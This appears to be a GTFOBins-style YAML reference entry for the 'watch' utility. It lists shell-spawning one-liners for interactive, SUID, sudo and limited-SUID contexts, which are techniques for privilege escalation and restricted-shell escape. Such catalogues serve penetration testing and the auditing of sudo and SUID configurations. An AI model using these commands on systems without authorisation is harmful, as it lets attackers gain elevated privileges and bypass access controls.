---
functions:
  execute-interactive:
    - code: watch -x sh -c 'reset; exec sh 1>&0 2>&0'
  suid-enabled:
    - description: This keeps the SUID privileges only if the `-x` option is present.
      code: ./watch -x sh -c 'reset; exec sh 1>&0 2>&0'
  sudo-enabled:
    - code: sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'
  suid-limited:
    - code: ./watch 'reset; exec sh 1>&0 2>&0'
---
